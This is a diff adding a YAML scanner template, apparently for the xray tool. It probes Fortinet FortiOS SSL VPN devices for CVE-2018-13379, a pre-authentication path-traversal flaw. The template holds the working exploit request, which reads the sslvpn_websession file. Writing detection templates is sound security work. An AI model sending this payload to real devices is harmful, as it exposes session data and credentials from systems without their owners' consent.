@@ -1,0 +1,16 @@
+name: poc-fortios-ssl-vpn-file-read
+transport: http
+set:
+  r0: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: GET
+      path: "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
+    expression: response.status == 200 && response.body.bcontains("SSLVPN")
+expression: r0()
+detail:
+  author: sxel
+  description: Fortinet FortiOS SSL VPN arbitrary file read probe (CVE-2018-13379, pre-auth)
+  severity: high
+  tags: fortinet,fortios,vpn,traversal,leak
